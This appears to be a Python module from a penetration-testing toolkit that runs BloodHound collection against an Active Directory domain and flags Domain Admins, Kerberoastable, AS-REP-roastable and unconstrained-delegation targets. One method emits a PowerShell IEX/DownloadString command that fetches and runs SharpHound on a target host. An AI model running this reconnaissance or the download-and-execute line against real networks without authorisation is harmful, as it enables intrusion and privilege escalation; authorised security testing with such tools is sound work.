#!/usr/bin/env python3
"""
NexusPen - BloodHound Integration Module
=========================================
BloodHound data collection and analysis.
"""

import subprocess
import os
import json
from typing import Dict, List, Optional
from dataclasses import dataclass
from pathlib import Path

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn

console = Console()


@dataclass
class BloodHoundResult:
    """BloodHound collection result."""
    output_dir: str
    files_collected: List[str]
    users_count: int
    computers_count: int
    groups_count: int


class BloodHoundCollector:
    """
    BloodHound data collection using bloodhound-python.
    """
    
    def __init__(self, domain: str, dc_ip: str, username: str, password: str):
        self.domain = domain
        self.dc_ip = dc_ip
        self.username = username
        self.password = password
    
    def collect_all(self, output_dir: str = None) -> BloodHoundResult:
        """
        Collect all BloodHound data.
        
        Args:
            output_dir: Output directory for JSON files
        """
        console.print("\n[cyan]🩸 Starting BloodHound collection...[/cyan]")
        
        output_dir = output_dir or f'/tmp/bloodhound_{self.domain}'
        Path(output_dir).mkdir(parents=True, exist_ok=True)
        
        result = BloodHoundResult(
            output_dir=output_dir,
            files_collected=[],
            users_count=0,
            computers_count=0,
            groups_count=0
        )
        
        try:
            cmd = [
                'bloodhound-python',
                '-d', self.domain,
                '-u', self.username,
                '-p', self.password,
                '-dc', self.dc_ip,
                '-ns', self.dc_ip,
                '-c', 'all',  # Collect all data
                '--zip',
                '-o', output_dir
            ]
            
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                console=console
            ) as progress:
                task = progress.add_task("Collecting data...", total=None)
                
                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
                
                progress.update(task, completed=True)
            
            # Find output files
            for file in os.listdir(output_dir):
                if file.endswith('.json') or file.endswith('.zip'):
                    result.files_collected.append(os.path.join(output_dir, file))
            
            # Parse counts from output
            if 'users' in proc.stdout.lower():
                import re
                users_match = re.search(r'(\d+)\s*users', proc.stdout)
                computers_match = re.search(r'(\d+)\s*computers', proc.stdout)
                groups_match = re.search(r'(\d+)\s*groups', proc.stdout)
                
                if users_match:
                    result.users_count = int(users_match.group(1))
                if computers_match:
                    result.computers_count = int(computers_match.group(1))
                if groups_match:
                    result.groups_count = int(groups_match.group(1))
            
            console.print(f"[green]✓ Collection complete![/green]")
            console.print(f"[green]  Users: {result.users_count}[/green]")
            console.print(f"[green]  Computers: {result.computers_count}[/green]")
            console.print(f"[green]  Groups: {result.groups_count}[/green]")
            console.print(f"[green]  Output: {output_dir}[/green]")
            
        except subprocess.TimeoutExpired:
            console.print("[yellow]⚠️ Collection timed out[/yellow]")
        except FileNotFoundError:
            console.print("[red]❌ bloodhound-python not found[/red]")
            console.print("[yellow]Install: pip install bloodhound[/yellow]")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
        
        return result
    
    def collect_specific(self, collection_method: str, 
                        output_dir: str = None) -> BloodHoundResult:
        """
        Collect specific data types.
        
        Args:
            collection_method: One of: Default, All, DCOnly, Group, LocalAdmin, 
                              Session, Trusts, ACL, Container, RDP, DCOM, PSRemote
            output_dir: Output directory
        """
        console.print(f"\n[cyan]🩸 BloodHound collection: {collection_method}[/cyan]")
        
        output_dir = output_dir or f'/tmp/bloodhound_{self.domain}'
        Path(output_dir).mkdir(parents=True, exist_ok=True)
        
        result = BloodHoundResult(
            output_dir=output_dir,
            files_collected=[],
            users_count=0,
            computers_count=0,
            groups_count=0
        )
        
        try:
            cmd = [
                'bloodhound-python',
                '-d', self.domain,
                '-u', self.username,
                '-p', self.password,
                '-dc', self.dc_ip,
                '-c', collection_method,
                '-o', output_dir
            ]
            
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            for file in os.listdir(output_dir):
                if file.endswith('.json'):
                    result.files_collected.append(os.path.join(output_dir, file))
            
            console.print(f"[green]✓ Collection complete: {result.files_collected}[/green]")
            
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
        
        return result
    
    def collect_with_sharphound(self, method: str = 'All') -> str:
        """
        Generate SharpHound command for in-memory collection.
        Returns PowerShell command to run on target.
        """
        console.print("\n[cyan]🩸 Generating SharpHound command...[/cyan]")
        
        command = f"""
# Download and execute SharpHound
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod {method} -OutputDirectory C:\\Temp -ZipFileName bloodhound.zip
"""
        
        console.print("[yellow]Run this on a domain-joined Windows machine:[/yellow]")
        console.print(f"[dim]{command}[/dim]")
        
        return command


class BloodHoundAnalyzer:
    """
    Analyze BloodHound data locally (without Neo4j).
    """
    
    def __init__(self, data_dir: str):
        self.data_dir = data_dir
        self.users = []
        self.computers = []
        self.groups = []
        self.domains = []
    
    def load_data(self):
        """Load BloodHound JSON files."""
        console.print("\n[cyan]📊 Loading BloodHound data...[/cyan]")
        
        for file in os.listdir(self.data_dir):
            if file.endswith('.json'):
                filepath = os.path.join(self.data_dir, file)
                with open(filepath, 'r') as f:
                    data = json.load(f)
                
                if 'users' in file.lower():
                    self.users = data.get('data', [])
                elif 'computers' in file.lower():
                    self.computers = data.get('data', [])
                elif 'groups' in file.lower():
                    self.groups = data.get('data', [])
                elif 'domains' in file.lower():
                    self.domains = data.get('data', [])
        
        console.print(f"[green]✓ Loaded: {len(self.users)} users, {len(self.computers)} computers, {len(self.groups)} groups[/green]")
    
    def find_domain_admins(self) -> List[Dict]:
        """Find all Domain Admin members."""
        admins = []
        
        for group in self.groups:
            if group.get('Properties', {}).get('name', '').upper() == 'DOMAIN ADMINS':
                members = group.get('Members', [])
                for member in members:
                    admins.append({
                        'name': member.get('MemberName'),
                        'type': member.get('MemberType')
                    })
        
        return admins
    
    def find_kerberoastable(self) -> List[Dict]:
        """Find Kerberoastable accounts."""
        kerberoastable = []
        
        for user in self.users:
            props = user.get('Properties', {})
            if props.get('hasspn'):
                kerberoastable.append({
                    'name': props.get('name'),
                    'spns': props.get('serviceprincipalnames', [])
                })
        
        return kerberoastable
    
    def find_asrep_roastable(self) -> List[Dict]:
        """Find AS-REP roastable accounts."""
        asrep = []
        
        for user in self.users:
            props = user.get('Properties', {})
            if props.get('dontreqpreauth'):
                asrep.append({
                    'name': props.get('name')
                })
        
        return asrep
    
    def find_unconstrained_delegation(self) -> List[Dict]:
        """Find computers with unconstrained delegation."""
        unconstrained = []
        
        for computer in self.computers:
            props = computer.get('Properties', {})
            if props.get('unconstraineddelegation'):
                unconstrained.append({
                    'name': props.get('name'),
                    'os': props.get('operatingsystem')
                })
        
        return unconstrained
    
    def find_high_value_targets(self) -> Dict:
        """Identify high-value targets for attacks."""
        targets = {
            'domain_admins': self.find_domain_admins(),
            'kerberoastable': self.find_kerberoastable(),
            'asrep_roastable': self.find_asrep_roastable(),
            'unconstrained_delegation': self.find_unconstrained_delegation(),
        }
        
        console.print("\n[bold cyan]═══ HIGH VALUE TARGETS ═══[/bold cyan]")
        console.print(f"[yellow]Domain Admins: {len(targets['domain_admins'])}[/yellow]")
        console.print(f"[yellow]Kerberoastable: {len(targets['kerberoastable'])}[/yellow]")
        console.print(f"[yellow]AS-REP Roastable: {len(targets['asrep_roastable'])}[/yellow]")
        console.print(f"[yellow]Unconstrained Delegation: {len(targets['unconstrained_delegation'])}[/yellow]")
        
        return targets


class ADPathFinder:
    """
    Find attack paths in AD (simplified local analysis).
    """
    
    def __init__(self, analyzer: BloodHoundAnalyzer):
        self.analyzer = analyzer
    
    def find_path_to_da(self, start_user: str) -> List[str]:
        """
        Find potential path from start user to Domain Admin.
        This is a simplified version - real analysis should use Neo4j.
        """
        console.print(f"\n[cyan]🎯 Finding path from {start_user} to Domain Admin...[/cyan]")
        
        path = []
        
        # Simplified path finding
        # In reality, BloodHound uses graph traversal
        
        # Check if user is in any privileged groups
        for group in self.analyzer.groups:
            members = group.get('Members', [])
            for member in members:
                if start_user.lower() in member.get('MemberName', '').lower():
                    group_name = group.get('Properties', {}).get('name')
                    path.append(f"Member of: {group_name}")
        
        console.print(f"[yellow]Path analysis requires Neo4j for full functionality[/yellow]")
        return path
    
    def find_shortest_path(self, start: str, end: str) -> List[str]:
        """Find shortest path between two nodes."""
        console.print(f"\n[cyan]🎯 Finding shortest path: {start} -> {end}[/cyan]")
        console.print("[yellow]Use BloodHound GUI with Neo4j for accurate path finding[/yellow]")
        
        return []
